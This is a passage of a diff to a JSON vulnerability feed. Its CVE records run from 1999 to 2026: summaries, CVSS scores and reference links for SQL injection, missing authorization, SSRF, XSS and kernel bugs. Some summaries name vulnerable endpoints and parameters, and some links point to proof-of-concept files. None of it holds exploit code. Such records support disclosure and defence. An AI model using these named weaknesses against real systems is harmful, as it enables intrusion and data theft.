-        "https://github.com/1Panel-dev/CordysCRM/blob/0d7ae06fe94f4ce33ec7f65b9d82a07ae05c2d94/backend/crm/src/main/java/cn/cordys/crm/approval/controller/ApprovalFlowController.java#L101-L105",
-        "https://github.com/AnkesKasty/cve-request-poc/blob/a7b6d1423555812d8efa26c91c5d0683164b31e5/CordysCRM/poc_approval_flow_webhook_test_ssrf.py",
-        "https://www.vulncheck.com/advisories/cordyscrm-through-1.9.3-missing-authorization-and-blind-ssrf-via-webhook-test"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-108700",
-      "summary": "1Panel-dev CordysCRM before 1.9.2 contains a missing authorization vulnerability that allows authenticated users to list business titles by calling POST /field/source/business-title without permission checks. Users lacking CONTRACT_BUSINESS_TITLE_READ can retrieve organization invoicing entities, exposing tax identification numbers, bank account numbers, opening banks, registration addresses, and phone numbers.",
-      "cvssScore": 4.2,
-      "severity": "Medium",
-      "published": "2026-10-11",
-      "modified": "2026-10-11",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-108700",
-        "https://github.com/1Panel-dev/CordysCRM/commit/a31fa16fb2dc86ab6b0fdc1ee58a204af424f38d",
-        "https://github.com/1Panel-dev/CordysCRM/blob/a0ef69d31fd98c338199579353840f34ef679197/backend/crm/src/main/java/cn/cordys/crm/system/controller/ModuleFieldController.java#L253-L257",
-        "https://github.com/AnkesKasty/cve-request-poc/blob/a7b6d1423555812d8efa26c91c5d0683164b31e5/CordysCRM/poc_field_source_family.py",
-        "https://www.vulncheck.com/advisories/1panel-dev-cordyscrm-before-1.9.2-missing-authorization-via-field-source-business-title"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-108690",
-      "summary": "mall4j through 4.0 contains an information disclosure vulnerability that allows authenticated customers to read other shoppers' cart items due to an operator precedence error in the getShopCartExpiryItems SQL filter. Attackers with any storefront account can request GET /p/shopCart/expiryProdList to retrieve off-shelf product basket entries including product, SKU, quantity, shop, and promoter card numbers.",
-      "cvssScore": 4.2,
-      "severity": "Medium",
-      "published": "2026-10-11",
-      "modified": "2026-10-11",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-108690",
-        "https://github.com/AnkesKasty/cve-request-poc/blob/a7b6d1423555812d8efa26c91c5d0683164b31e5/mall4j/poc_shopcart_expiry_prodlist.py",
-        "https://github.com/gz-yami/mall4j/blob/ffc672fc1aa4320ce02d0b93853bb456ae0a4dae/yami-shop-api/src/main/java/com/yami/shop/api/controller/ShopCartController.java#L162-L186",
-        "https://github.com/gz-yami/mall4j/blob/ffc672fc1aa4320ce02d0b93853bb456ae0a4dae/yami-shop-service/src/main/resources/mapper/BasketMapper.xml#L41-L48",
-        "https://www.vulncheck.com/advisories/mall4j-through-4.0-operator-precedence-error-exposes-other-users-cart-items-via-p-shopcart-expiryprodlist"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-2148",
-      "summary": "Lucent Ascend MAX Router 5.0 and earlier, Lucent Ascend Pipeline Router 6.0.2 and earlier and Lucent DSLTerminator allows remote attackers to obtain sensitive information such as hostname, MAC, and IP address of the Ethernet interface via a discard (UDP port 9) packet, which causes the device to leak the information in the response.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2002-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://online.securityfocus.com/archive/1/284650",
-        "http://www.iss.net/security_center/static/9704.php",
-        "http://www.securityfocus.com/bid/5335",
-        "http://online.securityfocus.com/archive/1/284650",
-        "http://www.iss.net/security_center/static/9704.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-89755",
-      "summary": "In the Linux kernel, the following vulnerability has been resolved:\n\nmm/migrate_device: clear stale mapping after freeing swapcache\n\n__migrate_device_pages() reads the folio mapping before calling\nfolio_free_swap().  When folio_free_swap() succeeds, the folio is removed\nfrom the swap cache, but the saved mapping still points to swap_space.\n\nPassing the stale mapping to folio_migrate_mapping() makes it use the\nmapped-folio path for a folio that is no longer in swapcache.  It can then\noperate on swap_space.i_pages with invalid reference accounting,\neventually triggering a folio reference count BUG.\n\nAfter a successful split, nr still contains the number of pages in the\noriginal large folio, although each resulting page is now a separate\norder-0 folio.  Reset nr to 1 so each split folio is processed separately,\nincluding its own swapcache removal and mapping lookup.\n\nRefresh the saved mapping after folio_free_swap() so the current folio\nstate is used during migration.",
-      "cvssScore": 6.1,
-      "severity": "Medium",
-      "published": "2026-09-11",
-      "modified": "2026-09-13",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-89755",
-        "https://git.kernel.org/stable/c/34a00895d032a414830d41106a09329ae6c251b6",
-        "https://git.kernel.org/stable/c/8ffedc6573a665cdc31ebe47eae7b32b78d0df83"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-89769",
-      "summary": "In the Linux kernel, the following vulnerability has been resolved:\n\nclocksource/drivers/nxp-pit: Fix IRQ leak on cpuhp_setup_state error path\n\nWhen cpuhp_setup_state fails after pit_clockevent_per_cpu_init has\nsuccessfully called request_irq, the error handling jumps directly to\nout_pit_clocksource_unregister without freeing the registered IRQ.\n\nThis leaks the IRQ line and, since kfree(pit) follows, leaves a\ndangling pointer registered as the interrupt handler's dev_id,\npotentially leading to a use-after-free if the IRQ fires afterwards.\n\nFix it by calling pit_clockevent_per_cpu_exit to properly release the\nIRQ before falling through to the existing cleanup chain.",
-      "cvssScore": 6.6,
-      "severity": "Medium",
-      "published": "2026-09-11",
-      "modified": "2026-09-13",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-89769",
-        "https://git.kernel.org/stable/c/05520e035f8332c8e33f3011b5ca016fde61793d",
-        "https://git.kernel.org/stable/c/cdcd861123248e871c2ec2be968b0a1b2a5a34b0",
-        "https://git.kernel.org/stable/c/d53c29a89a15e56a1797f3ef249955e544782e04"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-89764",
-      "summary": "In the Linux kernel, the following vulnerability has been resolved:\n\nrust: devres: fix race between concurrent revokers\n\nThere is a potential race condition when two paths try to revoke a\nDevres concurrently.\n\nThe driver core's devres_release_all() calls Revocable::revoke() via the\nrelease callback, while Devres::drop() calls revoke_nosync() on another\nCPU.\n\nThe revoker that does not claim the is_available swap returns\nimmediately, but the revoker that did may still be executing\ndrop_in_place() on the inner data. This can cause a use-after-free when\nthe other revoker's caller proceeds to drop adjacent resources that\ndrop_in_place() still references (e.g., Devres<DmaMappedSgt> racing with\nSGTable freeing the backing sg_table and pages).\n\nFix this by adding a Completion. The release callback signals the\nCompletion after revoke() finishes, and Devres::drop() waits for it when\nit loses the is_available swap. This ensures the wrapped object is fully\ntorn down before Devres::drop() returns.",
-      "cvssScore": 6.1,
-      "severity": "Medium",
-      "published": "2026-09-11",
-      "modified": "2026-09-13",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-89764",
-        "https://git.kernel.org/stable/c/acc516dfa1972d31836b50abc0115216cd0fccc5",
-        "https://git.kernel.org/stable/c/c7e3d57c705ab1053a6a1bbef96795e792da1540"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-0736",
-      "summary": "The showcode.asp sample file in IIS and Site Server allows remote attackers to read arbitrary files.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "1999-05-07",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/1999/ms99-013",
-        "https://oval.cisecurity.org/repository/search/definition/oval%3Aorg.mitre.oval%3Adef%3A932",
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/1999/ms99-013",
-        "https://oval.cisecurity.org/repository/search/definition/oval%3Aorg.mitre.oval%3Adef%3A932"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2003-1238",
-      "summary": "Cross-site scripting vulnerability (XSS) in Nuked-Klan 1.3 beta and earlier allows remote attackers to steal authentication information via cookies by injecting arbitrary HTML or script into op of the (1) Team, (2) News, and (3) Liens modules.",
-      "cvssScore": 5.8,
-      "severity": "Medium",
-      "published": "2003-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2003-02/0276.html",
-        "http://archives.neohapsis.com/archives/bugtraq/2003-03/0275.html",
-        "http://www.iss.net/security_center/static/11420.php",
-        "http://www.securityfocus.com/bid/6916",
-        "http://archives.neohapsis.com/archives/bugtraq/2003-02/0276.html"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2003-1239",
-      "summary": "Directory traversal vulnerability in sendphoto.php in WihPhoto 0.86 allows remote attackers to read arbitrary files via .. specifiers in the album parameter, and the target filename in the pic parameter.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2003-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/vulnwatch/2003-q1/0092.html",
-        "http://www.iss.net/security_center/static/11429.php",
-        "http://www.securityfocus.com/archive/1/312966",
-        "http://www.securityfocus.com/bid/6929",
-        "http://archives.neohapsis.com/archives/vulnwatch/2003-q1/0092.html"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-90521",
-      "summary": "A vulnerability was found in jaychouchannel Tourism-Management-System up to 8122bf020d91199eddfff3ee02d1632a70a9a132. This issue affects some unknown processing of the file MenpiaodingdanController.java of the component CRUD. The manipulation of the argument ID results in authorization bypass. It is possible to launch the attack remotely. The exploit has been made public and could be used. This product takes the approach of rolling releases to provide continious delivery. Therefore, version details for affected and updated releases are not available. The patch is identified as d44ec3aa0bd2a72c8800e3befb0a9a96a6491b86. It is best practice to apply a patch to resolve this issue.",
-      "cvssScore": 6.3,
-      "severity": "Medium",
-      "published": "2026-09-13",
-      "modified": null,
-      "cwe": "CWE-285",
-      "references": [
-        "https://github.com/jaychouchannel/Tourism-Management-System/",
-        "https://github.com/jaychouchannel/Tourism-Management-System/commit/d44ec3aa0bd2a72c8800e3befb0a9a96a6491b86",
-        "https://github.com/jaychouchannel/Tourism-Management-System/issues/9",
-        "https://github.com/jaychouchannel/Tourism-Management-System/pull/14",
-        "https://vuldb.com/cve/CVE-2026-90521"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-2179",
-      "summary": "asycpict.dll, as used in Microsoft products such as Front Page 97 and 98, allows remote attackers to cause a denial of service (hang) via a JPEG image with maximum height and width values.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2004-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.securityfocus.com/archive/1/378431",
-        "http://www.securityfocus.com/archive/1/378619",
-        "http://www.securityfocus.com/bid/11412",
-        "http://www.securityfocus.com/archive/1/378431",
-        "http://www.securityfocus.com/archive/1/378619"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-2180",
-      "summary": "Multiple cross-site scripting (XSS) vulnerabilities in WowBB Forum 1.61 allow remote attackers to inject arbitrary web script or HTML via the (1) country parameter to view_user.php, (2) show parameter to view_forum.php, (3) letter parameter to view_user.php, (4) highlight parameter to view_topic.php, (5) show parameter to index.php, (6) q parameter to search.php, (7) Referer header to admin.php, or the (8) user_email parameter to login.php.",
-      "cvssScore": 4.3,
-      "severity": "Medium",
-      "published": "2004-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.maxpatrol.com/advdetails.asp?id=7",
-        "http://www.securityfocus.com/bid/11429",
-        "http://www.maxpatrol.com/advdetails.asp?id=7",
-        "http://www.securityfocus.com/bid/11429"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-2181",
-      "summary": "Multiple SQL injection vulnerabilities in WowBB Forum 1.61 allow remote attackers to execute arbitrary SQL commands via the (1) sort_by or (2) page parameters to view_user.php, or the (3) forum_id parameter to view_topic.php.  NOTE: the sort_by vector was later reported to be present in WowBB 1.65.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2004-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://pridels0.blogspot.com/2005/11/wowbb-165-sql-vuln.html",
-        "http://www.maxpatrol.com/advdetails.asp?id=7",
-        "http://www.securityfocus.com/bid/11429",
-        "http://pridels0.blogspot.com/2005/11/wowbb-165-sql-vuln.html",
-        "http://www.maxpatrol.com/advdetails.asp?id=7"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-2182",
-      "summary": "Session fixation vulnerability in Macromedia JRun 4.0 allows remote attackers to hijack user sessions by pre-setting the user session ID information used by the session server.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2004-12-31",
-      "modified": null,
-      "cwe": "CWE-287",
-      "references": [
-        "http://www.macromedia.com/devnet/security/security_zone/mpsb04-08.html",
-        "http://www.securityfocus.com/bid/11414",
-        "http://www.macromedia.com/devnet/security/security_zone/mpsb04-08.html",
-        "http://www.securityfocus.com/bid/11414"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-2183",
-      "summary": "Unknown vulnerability in WeHelpBUS 0.1 allows remote attackers to execute arbitrary shell commands via the query string.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2004-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://sourceforge.net/project/shownotes.php?release_id=275295",
-        "http://www.securityfocus.com/bid/11431",
-        "http://sourceforge.net/project/shownotes.php?release_id=275295",
-        "http://www.securityfocus.com/bid/11431"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-2184",
-      "summary": "Directory traversal vulnerability in Digicraft Yak! server 2.0 through 2.1.2 allows remote attackers to read or write arbitrary files via \"../\" or \"..\\\" sequences in commands such as (1) dir or (2) put.",
-      "cvssScore": 6.4,
-      "severity": "Medium",
-      "published": "2004-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://aluigi.altervista.org/adv/yak-adv.txt",
-        "http://marc.info/?l=full-disclosure&m=109788315103778&w=2",
-        "http://secunia.com/advisories/12849",
-        "http://securitytracker.com/id?1011708",
-        "http://www.osvdb.org/10763"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-2185",
-      "summary": "Multiple cross-site scripting (XSS) vulnerabilities in MediaWiki 1.3.5 allow remote attackers to execute arbitrary scripts and/or SQL queries via (1) the UnicodeConverter extension, (2) raw page views, (3) SpecialIpblocklist, (4) SpecialEmailuser, (5) SpecialMaintenance, and (6) ImagePage.",
-      "cvssScore": 6.8,
-      "severity": "Medium",
-      "published": "2004-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://sourceforge.net/project/shownotes.php?release_id=275099",
-        "http://www.securityfocus.com/bid/11416",
-        "http://sourceforge.net/project/shownotes.php?release_id=275099",
-        "http://www.securityfocus.com/bid/11416"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-2186",
-      "summary": "SQL injection vulnerability in MediaWiki 1.3.5 allows remote attackers to execute arbitrary SQL commands via SpecialMaintenance.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2004-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://sourceforge.net/project/shownotes.php?release_id=275099",
-        "http://www.securityfocus.com/bid/11416",
-        "http://sourceforge.net/project/shownotes.php?release_id=275099",
-        "http://www.securityfocus.com/bid/11416"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-2187",
-      "summary": "Unknown vulnerability in ImagePage for MediaWiki 1.3.5, related to \"filename validation,\" has unknown impact and attack vectors.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2004-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://sourceforge.net/project/shownotes.php?release_id=275099",
-        "http://www.securityfocus.com/bid/11416",
-        "http://sourceforge.net/project/shownotes.php?release_id=275099",
-        "http://www.securityfocus.com/bid/11416"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-1657",
-      "summary": "Cross-site scripting (XSS) vulnerability in the Activity and Events Viewer for Newtelligence DasBlog allows remote attackers to inject arbitrary web script or HTML via the (1) User Agent or (2) Referrer HTTP headers.",
-      "cvssScore": 4.3,
-      "severity": "Medium",
-      "published": "2004-09-01",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=109443321830050&w=2",
-        "http://secunia.com/advisories/12416",
-        "http://staff.newtelligence.net/clemensv/PermaLink.aspx?guid=69bce168-cb09-4f09-8d53-f0b97f11b198",
-        "http://www.securityfocus.com/bid/11086",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/17174"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-0637",
-      "summary": "Oracle Database Server 8.1.7.4 through 9.2.0.4 allows local users to execute commands with additional privileges via the ctxsys.driload package, which is publicly accessible.",
-      "cvssScore": 6.5,
-      "severity": "Medium",
-      "published": "2004-09-02",
-      "modified": null,
-      "cwe": "CWE-94",
-      "references": [
-        "http://secunia.com/advisories/12409/",
-        "http://www.idefense.com/application/poi/display?id=136&type=vulnerabilities&flashstatus=true",
-        "http://www.kb.cert.org/vuls/id/316206",
-        "http://www.securityfocus.com/bid/11099",
-        "http://secunia.com/advisories/12409/"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-1658",
-      "summary": "Kerio Personal Firewall 4.0 (KPF4) allows local users with administrative privileges to bypass the Application Security feature and execute arbitrary processes by directly writing to \\device\\physicalmemory to restore the running kernel's SDT ServiceTable.",
+      "id": "CVE-2000-0364",
+      "summary": "screen and rxvt in Red Hat Linux 6.0 do not properly set the modes of tty devices, which allows local users to write to other ttys.",
       "cvssScore": 4.6,
       "severity": "Medium",
-      "published": "2004-09-02",
+      "published": "1999-06-01",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://marc.info/?l=bugtraq&m=109420310631039&w=2",
-        "http://secunia.com/advisories/12468/",
-        "http://www.security.org.sg/vuln/kerio4016.html",
-        "http://www.securityfocus.com/bid/11096",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/17270"
+        "http://marc.info/?l=bugtraq&m=92877527701347&w=2",
+        "http://marc.info/?l=bugtraq&m=92886009012161&w=2",
+        "http://www.redhat.com/corp/support/errata/RHSA1999014_01.html",
+        "http://www.securityfocus.com/bid/309",
+        "http://marc.info/?l=bugtraq&m=92877527701347&w=2"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2004-1659",
-      "summary": "Cross-site scripting (XSS) vulnerability in index.php in CuteNews 1.3.6 and earlier allows remote attackers with Administrator, Editor, Journalist or Commenter privileges to inject arbitrary web script or HTML via the mod parameter.",
+      "id": "CVE-2004-1234",
+      "summary": "load_elf_binary in Linux before 2.4.26 allows local users to cause a denial of service (system crash) via an ELF binary in which the interpreter is NULL.",
+      "cvssScore": 2.1,
+      "severity": "Low",
+      "published": "2004-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://bugzilla.redhat.com/bugzilla/show_bug.cgi?id=142965",
+        "http://linux.bkbits.net:8080/linux-2.4/cset%404076466d_SqUm4azg4_v3FIG2-X6XQ",
+        "http://secunia.com/advisories/20162",
+        "http://secunia.com/advisories/20163",
+        "http://secunia.com/advisories/20202"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-63774",
+      "summary": "Insufficient input validation in the PowerSYSTEM Center report designer allows an authenticated user to execute unauthorized SQL commands.",
+      "cvssScore": 7.3,
+      "severity": "High",
+      "published": "2026-11-06",
+      "modified": "2026-11-06",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-63774",
+        "https://github.com/cisagov/CSAF/blob/develop/csaf_files/OT/white/2026/icsa-26-307-01.json",
+        "https://www.cisa.gov/news-events/ics-advisories/icsa-26-307-01"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-63017",
+      "summary": "Incorrect authorization in PowerSYSTEM Center allows a low-privileged, authenticated user to access resources normally limited to administrators.",
+      "cvssScore": 7.3,
+      "severity": "High",
+      "published": "2026-11-06",
+      "modified": "2026-11-06",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-63017",
+        "https://github.com/cisagov/CSAF/blob/develop/csaf_files/OT/white/2026/icsa-26-307-01.json",
+        "https://www.cisa.gov/news-events/ics-advisories/icsa-26-307-01"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-123268",
+      "summary": "A security vulnerability has been detected in libyal libvmdk up to 3fdd7839758e9f44ef95e1dfccde8552b860a4fc. Affected is the function libvmdk_extent_table_get_extent_data_file_path of the file libvmdk/libvmdk_extent_table.c of the component Extent Data File Handler. The manipulation leads to memory corruption. The attack may be initiated remotely. The exploit has been disclosed publicly and may be used. This product uses a rolling release model to deliver continuous updates. As a result, specific version information for affected or updated releases is not available. The identifier of the patch is 175d3fc0a0b961f362f16e7560a6169d7213e16b. Applying a patch is the recommended action to fix this issue.",
+      "cvssScore": 4.6,
+      "severity": "Medium",
+      "published": "2026-11-06",
+      "modified": "2026-11-06",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-123268",
+        "https://github.com/libyal/libvmdk/issues/39",
+        "https://github.com/libyal/libvmdk/commit/175d3fc0a0b961f362f16e7560a6169d7213e16b",
+        "https://github.com/libyal/libvmdk",
+        "https://github.com/user-attachments/files/33394147/01_memory_leak_poc.zip"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-123269",
+      "summary": "A vulnerability was detected in libyal libvmdk. Affected by this vulnerability is the function libvmdk_descriptor_file_read_header of the file libvmdk/libvmdk_descriptor_file.c of the component Descriptor File Parser. The manipulation results in out-of-bounds read. The attack must be initiated from a local position. The exploit is now public and may be used. The patch is identified as 175d3fc0a0b961f362f16e7560a6169d7213e16b. It is best practice to apply a patch to resolve this issue.",
       "cvssScore": 4.3,
       "severity": "Medium",
-      "published": "2004-09-02",
-      "modified": null,
+      "published": "2026-11-06",
+      "modified": "2026-11-06",
       "cwe": null,
       "references": [
-        "http://marc.info/?l=bugtraq&m=109415338521881&w=2",
-        "http://secunia.com/advisories/12432",
-        "http://www.securityfocus.com/bid/11097",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/17214",
-        "http://marc.info/?l=bugtraq&m=109415338521881&w=2"
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-123269",
+        "https://github.com/libyal/libvmdk/issues/41",
+        "https://github.com/libyal/libvmdk/commit/175d3fc0a0b961f362f16e7560a6169d7213e16b",
+        "https://github.com/libyal/libvmdk",
+        "https://github.com/user-attachments/files/33394231/03_integer_underflow_poc.zip"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2004-1661",
-      "summary": "MailWorks Professional allows remote attackers to bypass authentication and gain privileges via a cookie that contains \"auth=1\" and \"uId=1.\"",
+      "id": "CVE-2025-71458",
+      "summary": "FTS3 Web Monitoring (fts-monitoring) versions 3.12.0 through 3.13.2 and 3.14.0 contain an unauthenticated sql injection vulnerability in the /linkinfo endpoint handled by get_linkinfo. Remote attackers can inject SQL through the source_se and dest_se query parameters to perform blind injection and read stored cloud storage credentials and token provider client secrets.",
+      "cvssScore": 5.3,
+      "severity": "Medium",
+      "published": "2026-11-06",
+      "modified": "2026-11-06",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2025-71458",
+        "https://github.com/cern-fts/fts-monitoring/commit/96241f6e9911195aae8e9e07bce511da4e81fc08",
+        "https://github.com/cern-fts/fts-monitoring/commit/e993c27d60a150c67cc2b415ddb272b5d3f05596",
+        "https://advisories.egi.eu/Advisory-EGI-SVG-2025-09",
+        "https://github.com/cern-fts/fts-monitoring"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-92823",
+      "summary": "A flaw was found in libmodulemd. In builds with rpmio support enabled, compressed modulemd YAML is decompressed through a custom read handler that does not enforce a cumulative decompressed-size limit before parsing. An attacker who can supply a highly compressible compressed YAML file can cause excessive CPU and memory consumption, resulting in a denial of service.",
+      "cvssScore": 6.7,
+      "severity": "Medium",
+      "published": "2026-10-21",
+      "modified": "2026-11-06",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-92823",
+        "https://github.com/fedora-modularity/libmodulemd/pull/644",
+        "https://access.redhat.com/security/cve/CVE-2026-92823",
+        "https://bugzilla.redhat.com/show_bug.cgi?id=2478703",
+        "https://github.com/advisories/GHSA-x9m8-9g38-v659"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-92824",
+      "summary": "A flaw was found in libmodulemd. In the module stream v2 rpm-map emission path, an inner loop incorrectly uses the count of digest algorithms as its bound instead of the number of checksums in the current digest table. Crafted modulemd v2 metadata with multiple digest types can trigger an out-of-bounds read during YAML serialization, typically causing a crash and resulting in a denial of service.",
+      "cvssScore": 6.7,
+      "severity": "Medium",
+      "published": "2026-10-21",
+      "modified": "2026-11-06",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-92824",
+        "https://github.com/fedora-modularity/libmodulemd/pull/643",
+        "https://access.redhat.com/security/cve/CVE-2026-92824",
+        "https://bugzilla.redhat.com/show_bug.cgi?id=2478495",
+        "https://github.com/advisories/GHSA-j65x-29mg-x4cj"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-92822",
+      "summary": "A flaw was found in libmodulemd. When parsing module metadata, the xmd field is converted into nested GVariant values through recursive YAML mapping and sequence helpers without a recursion-depth or node-count limit. An attacker who can supply crafted modulemd YAML with deeply nested xmd content can cause stack exhaustion or excessive resource consumption, resulting in a denial of service.",
+      "cvssScore": 6.7,
+      "severity": "Medium",
+      "published": "2026-10-21",
+      "modified": "2026-11-06",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-92822",
+        "https://github.com/fedora-modularity/libmodulemd/pull/645",
+        "https://access.redhat.com/security/cve/CVE-2026-92822",
+        "https://bugzilla.redhat.com/show_bug.cgi?id=2479002",
+        "https://github.com/advisories/GHSA-85r9-7wj5-x6x5"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-111079",
+      "summary": "A flaw was found in Goose. When the terminal integration feature is enabled, the application captures shell command history and sends it verbatim without sanitization to configured Large Language Model (LLM) provider endpoints during queries. If a user enters sensitive data—such as API tokens, passwords, or environment variables containing secrets—in the terminal, this unredacted information is transmitted across trust boundaries. This can lead to sensitive information disclosure, exposing confidential credentials to external service providers and logs.",
+      "cvssScore": 4.6,
+      "severity": "Medium",
+      "published": "2026-10-22",
+      "modified": "2026-11-06",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-111079",
+        "https://access.redhat.com/errata/RHSA-2026:95723",
+        "https://access.redhat.com/errata/RHSA-2026:95724",
+        "https://access.redhat.com/security/cve/CVE-2026-111079",
+        "https://bugzilla.redhat.com/show_bug.cgi?id=2554025"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-107492",
+      "summary": "Rejected reason: This CVE ID has been rejected or withdrawn by its CVE Numbering Authority.",
+      "cvssScore": null,
+      "severity": "Unknown",
+      "published": "2026-11-06",
+      "modified": "2026-11-06",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-107492"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-94449",
+      "summary": "A flaw was found in the SmallRye Fault Tolerance library, which is used by Quarkus to provide strategies like retries and circuit breakers for microservices. The issue occurs when using the ApplyGuard or ApplyFaultTolerance annotations, where the library fails to release internal tracking objects after each request. This causes a steady increase in memory usage that eventually leads to the application slowing down and crashing due to lack of memory.",
+      "cvssScore": 8.1,
+      "severity": "High",
+      "published": "2026-09-21",
+      "modified": "2026-11-06",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-94449",
+        "https://access.redhat.com/errata/RHSA-2026:83082",
+        "https://access.redhat.com/errata/RHSA-2026:83520",
+        "https://access.redhat.com/errata/RHSA-2026:83670",
+        "https://access.redhat.com/security/cve/CVE-2026-94449"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-86800",
+      "summary": "The Hide My WP Ghost WordPress plugin before 7.0.11 does not properly validate a loopback security-check request before disabling its login and URL hiding protection, dropping that protection precisely when the request's verification value is missing or incorrect, which any visitor can arrange, allowing unauthenticated attackers to re-expose the concealed WordPress login page location.",
+      "cvssScore": 5.3,
+      "severity": "Medium",
